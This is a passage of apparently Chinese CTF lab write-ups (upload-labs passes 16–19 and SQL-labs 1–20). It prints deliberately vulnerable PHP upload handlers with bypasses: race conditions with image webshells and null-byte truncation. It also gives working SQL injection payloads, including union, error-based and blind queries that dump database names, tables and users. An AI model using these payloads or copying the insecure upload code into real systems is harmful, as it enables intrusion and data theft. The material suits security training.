class="hljs-string">&#x27;/&#x27;</span>.$newfilename;<br>                imagepng($im,$img_path);<br><br>                @unlink($target_path);<br>                $is_upload = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            $im = imagecreatefromgif($target_path);<br>            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;<br>                $msg = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @unlink($target_path);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                $newfilename = strval(rand()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;<br>                imagegif($im,$img_path);<br><br>                @unlink($target_path);<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $msg = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485</span><br></code></pre></td></tr></table></figure><p>判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，具体可以参考<a href="https://xz.aliyun.com/t/2657#toc-13">这篇文章</a>，可是在复现的时候还是因为二次渲染以后php代码还是出被修改。</p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17-条件竞争"></a>Pass-17-条件竞争</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    $file_ext = substr($file_name,strrpos($file_name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    $upload_file = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $file_name;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;<br>        <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;<br>             $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;<br>             rename($upload_file, $img_path);<br>             $is_upload = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            unlink($upload_file);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324</span><br></code></pre></td></tr></table></figure><p>这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可<br><img src="https://img-blog.csdnimg.cn/20190619101858627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619101917177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18-条件竞争"></a>Pass-18-条件竞争</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    $imgFileName =time();<br>    $u = <span class="hljs-keyword">new</span> MyUpload($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],$imgFileName);<br>    $status_code = $u-&gt;upload(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> ($status_code) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            $is_upload = <span class="hljs-literal">true</span>;<br>            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            $msg = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>            $msg = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-2</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-3</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-4</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-5</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-6</span>:<br>            $msg = <span class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            $msg = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> $cls_arr_ext_accepted = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> $dir </span>)</span>&#123;<br>    <br>    $ret = <span class="hljs-keyword">$this</span>-&gt;isUploadedFile();<br>    <br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;setDir( $dir );<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkExtension();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkSize();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      $ret = <span class="hljs-keyword">$this</span>-&gt;checkFileExists();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;move();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      $ret = <span class="hljs-keyword">$this</span>-&gt;renameFile();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190619104159629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p><p><img src="https://img-blog.csdnimg.cn/20190619120245814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619120306313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-19-00截断"><a href="#Pass-19-00截断" class="headerlink" title="Pass-19-00截断"></a>Pass-19-00截断</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        $file_name = $_POST[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .$file_name;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; <br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            $msg = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">1234567891011121314151617181920212223242526</span><br></code></pre></td></tr></table></figure><p>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</p><p><img src="https://img-blog.csdnimg.cn/2019061912220724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619122142117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190619122230333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL labs11-20</title>
      <link href="/2021/02/18/2021/sql/11-20/"/>
      <url>/2021/02/18/2021/sql/11-20/</url>
      
        <content type="html"><![CDATA[<h4 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h4><p>万能密码可登录</p><p>之后union查询即可</p><h4 id="第十二关："><a href="#第十二关：" class="headerlink" title="第十二关："></a>第十二关：</h4><p>与11类似</p><h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>这里开始又是盲注范畴</p><p>脚本upupup</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27;)and left(database(),1)&gt;<span class="hljs-string">&#x27;r&#x27;</span>#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit//登录成功<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27;)and left(database(),1)&gt;<span class="hljs-string">&#x27;s&#x27;</span>#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit//登录失败<br></code></pre></td></tr></table></figure><p>手工注入</p><h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&quot;and extractvalue(1,concat(0x7e,(select username <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=1),0x7e))#&amp;passwd=1&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>报错注入，post提交</p><p><img src="/2021/02/18/2021/sql/11-20/image-20220304213044994.png" alt="image-20220304213044994"></p><p> 理解到了group_concat函数作为连接字符串的作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname=admin&quot;and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">id</span>,<span class="hljs-number">0x3a</span>,username)<span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p><img src="/2021/02/18/2021/sql/11-20/image-20220305155916264.png" alt="image-20220305155916264"></p><h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>延时注入</p><p>正确的时候可以直接登录，不正确的时候延时5秒。</p><p><img src="/2021/02/18/2021/sql/11-20/image-20220305160231930.png" alt="image-20220305160231930"></p><p><img src="/2021/02/18/2021/sql/11-20/image-20220305160301815.png" alt="image-20220305160301815"></p><h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>演示注入</p><h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p> 延时注入</p><h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>UA注入</p><h4 id="第十九关："><a href="#第十九关：" class="headerlink" title="第十九关："></a>第十九关：</h4><p>referer注入</p><h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p>Cookie注入</p>]]></content>
      
      
      <categories>
          
          <category> SQL-lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL labs1-10</title>
      <link href="/2020/12/09/2021/sql/1-10/"/>
      <url>/2020/12/09/2021/sql/1-10/</url>
      
        <content type="html"><![CDATA[<h4 id="Less1：（基于错误的GET单引号字符型注入"><a href="#Less1：（基于错误的GET单引号字符型注入" class="headerlink" title="Less1：（基于错误的GET单引号字符型注入)"></a>Less1：（基于错误的GET单引号字符型注入)</h4><p>解题思路：</p><p><strong>方法一，union 联合查询注入</strong></p><p>1，首先判断是否存在注入 / ？id=1’   回显错误，去掉 ‘ 发现回显正常，发现是<strong>单引号字符型注入</strong></p><p><strong>注意此时因为前面报错可以看到有limit 0,1我们可以知道此处如果需要输出我们union查询出的信息要将前面的位占了，即使前面的输出为不存在。可以看到我是将id的值写为负值，然后将输出的位置就让给了后面我们需要输出的信息，这个技巧在有输出限制的时候十分重要。</strong></p><p>2，然后用 order by 判断有几列数据</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">/ ?id = <span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span> %<span class="hljs-number">23</span>  <br></code></pre></td></tr></table></figure><p>回显正常，order by 4 的时候发现回显错误，说明有3 列</p><p><strong>我们上面猜测出了字段数为3，但这里输出的只有2个，所以我们union查询要保证字段数一样，不足的补数字（只有mysql可以），或者null。然后第一个是没有输出的，所以我将需要输出的写在了后面两个。</strong></p><p>3，将id=1改为一个数据库不存在的id值，如-1，使用union select 1,2,3联合查询语句查看页面是否有显示位。</p><p>发现页面先输出了2和3，说明页面有2个显示位</p><p>4，然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息</p><p>（1） 爆数据库名：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">?id=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata %<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><strong>上面的爆出全部的数据库名，\</strong>下面的爆当前的数据库名：****</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">?id=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() %<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>（2） 爆表名：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() %<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>（3）爆字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>（4）爆内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span 